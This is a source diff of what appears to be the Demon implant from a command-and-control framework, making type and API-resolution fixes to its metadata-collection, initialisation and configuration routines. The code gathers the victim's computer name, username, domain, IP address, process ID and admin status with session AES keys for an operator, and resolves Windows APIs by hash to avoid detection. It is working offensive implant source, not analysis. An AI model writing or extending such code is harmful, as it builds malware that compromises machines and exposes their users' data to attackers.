@@ -100,6 +100,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PIP_ADAPTER_INFO Adapter    = NULL;
     OSVERSIONINFOEXW OsVersions = { 0 };
     SIZE_T           Length     = 0;
+    DWORD            dwLength   = 0;
 
     /* Check we if we want to add the Agent Header + CommandID too */
     if ( Header )
@@ -156,21 +157,21 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     */
 
     // Add AES Keys/IV
-    PackageAddPad( *MetaData, Instance.Config.AES.Key, 32 );
-    PackageAddPad( *MetaData, Instance.Config.AES.IV,  16 );
+    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.Key, 32 );
+    PackageAddPad( *MetaData, ( PCHAR ) Instance.Config.AES.IV,  16 );
 
     // Add session id
     PackageAddInt32( *MetaData, Instance.Session.AgentID );
 
     // Get Computer name
-    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
+    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &dwLength ) )
     {
-        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
+        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
-            MemSet( Data, 0, Length );
-            Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
-            PackageAddBytes( *MetaData, Data, Length );
-            DATA_FREE( Data, Length );
+            MemSet( Data, 0, dwLength );
+            Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength );
+            PackageAddBytes( *MetaData, Data, dwLength );
+            DATA_FREE( Data, dwLength );
         }
         else
             PackageAddInt32( *MetaData, 0 );
@@ -179,13 +180,13 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddInt32( *MetaData, 0 );
 
     // Get Username
-    Length = MAX_PATH;
-    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
+    dwLength = MAX_PATH;
+    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
     {
-        MemSet( Data, 0, Length );
-        Instance.Win32.GetUserNameA( Data, &Length );
-        PackageAddBytes( *MetaData, Data, Length );
-        DATA_FREE( Data, Length );
+        MemSet( Data, 0, dwLength );
+        Instance.Win32.GetUserNameA( Data, &dwLength );
+        PackageAddBytes( *MetaData, Data, dwLength );
+        DATA_FREE( Data, dwLength );
     }
     else
         PackageAddInt32( *MetaData, 0 );
@@ -193,14 +194,14 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
     // Get Domain
     Length = 0;
-    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
+    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &dwLength ) )
     {
-        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
+        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
-            MemSet( Data, 0, Length );
-            Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
-            PackageAddBytes( *MetaData, Data, Length );
-            DATA_FREE( Data, Length );
+            MemSet( Data, 0, dwLength );
+            Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength );
+            PackageAddBytes( *MetaData, Data, dwLength );
+            DATA_FREE( Data, dwLength );
         }
         else
             PackageAddInt32( *MetaData, 0 );
@@ -208,13 +209,13 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     else
         PackageAddInt32( *MetaData, 0 );
 
-    Instance.Win32.GetAdaptersInfo( NULL, &Length );
-    if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
+    Instance.Win32.GetAdaptersInfo( NULL, &dwLength );
+    if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
     {
-        if ( Instance.Win32.GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
+        if ( Instance.Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
         {
-            PackageAddBytes( *MetaData, Adapter->IpAddressList.IpAddress.String, 16 );
-            DATA_FREE( Adapter, Length );
+            PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
+            DATA_FREE( Adapter, dwLength );
         }
         else
             PackageAddInt32( *MetaData, 0 );
@@ -234,7 +235,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddBytes( *MetaData, Data, Length );
     } else PackageAddInt32( *MetaData, 0 );
 
-    PackageAddInt32( *MetaData, Instance.Teb->ClientId.UniqueProcess );
+    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueProcess );
     PackageAddInt32( *MetaData, Instance.Session.PPID );
     PackageAddInt32( *MetaData, Instance.Session.ProcessArch );
     PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
@@ -313,6 +314,7 @@ VOID DemonInit( VOID )
         Instance.Win32.Process32NextW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32NextW );
         Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreatePipe );
         Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessA );
+        Instance.Win32.CreateProcessW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessW );
         Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFileW );
         Instance.Win32.GetFullPathNameW                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFullPathNameW );
         Instance.Win32.GetFileSize                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileSize );
@@ -659,6 +661,7 @@ VOID DemonInit( VOID )
         Instance.Win32.RevertToSelf                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_RevertToSelf );
         Instance.Win32.GetUserNameA                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetUserNameA );
         Instance.Win32.LogonUserA                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserA );
+        Instance.Win32.LogonUserW                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserW );
         Instance.Win32.LookupPrivilegeValueA               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupPrivilegeValueA );
         Instance.Win32.LookupAccountSidA                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupAccountSidA );
         Instance.Win32.OpenThreadToken                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_OpenThreadToken );
@@ -824,10 +827,10 @@ VOID DemonInit( VOID )
 
     if ( ! Instance.Session.ModuleBase )
         /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
-        Instance.Session.ModuleBase = LdrModulePeb( NULL );
+        Instance.Session.ModuleBase = LdrModulePeb( 0 );
 
     Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
-    Instance.Session.PID         = Instance.Teb->ClientId.UniqueProcess;
+    Instance.Session.PID         = (DWORD)(ULONG_PTR)Instance.Teb->ClientId.UniqueProcess;
     Instance.Session.ProcessArch = PROCESS_AGENT_ARCH;
     Instance.Session.Connected   = FALSE;
     Instance.Session.AgentID     = RandomNumber32(); // generate a random ID
@@ -852,7 +855,7 @@ VOID DemonConfig()
     PARSER Parser = { 0 };
     PVOID  Buffer = NULL;
     ULONG  Temp   = 0;
-    DWORD  Length = 0;
+    UINT32 Length = 0;
     DWORD  J      = 0;
 
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
@@ -878,17 +881,15 @@ VOID DemonConfig()
     Buffer = ParserGetBytes( &Parser, &Length );
     Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Length );
     MemCopy( Instance.Config.Process.Spawn64, Buffer, Length );
-    Instance.Config.Process.Spawn64[ Length ] = 0;
 
     Buffer = ParserGetBytes( &Parser, &Length );
     Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Length );
     MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );
-    Instance.Config.Process.Spawn86[ Length ] = 0;
 
     PRINTF(
             "[CONFIG] Spawn: \n"
-            " - [x64] => %s  \n"
-            " - [x86] => %s  \n",
+            " - [x64] => %ls  \n"
+            " - [x86] => %ls  \n",
             Instance.Config.Process.Spawn64,
             Instance.Config.Process.Spawn86
     )
@@ -906,7 +907,7 @@ VOID DemonConfig()
     Instance.Config.Transport.KillDate       = ParserGetInt64( &Parser );
     PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
     // check if the kill date has already passed
-    if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+    if ( Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate )
     {
         // refuse to run
         // TODO: exit process?
@@ -1030,7 +1031,7 @@ VOID DemonConfig()
     Instance.Config.Transport.KillDate = ParserGetInt64( &Parser );
     PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
     // check if the kill date has already passed
-    if ( Instance.Config.Transport.KillDate && GetSystemTimeAsUnixTime() >= Instance.Config.Transport.KillDate )
+    if ( Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate )
     {
         // refuse to run
         // TODO: exit process?
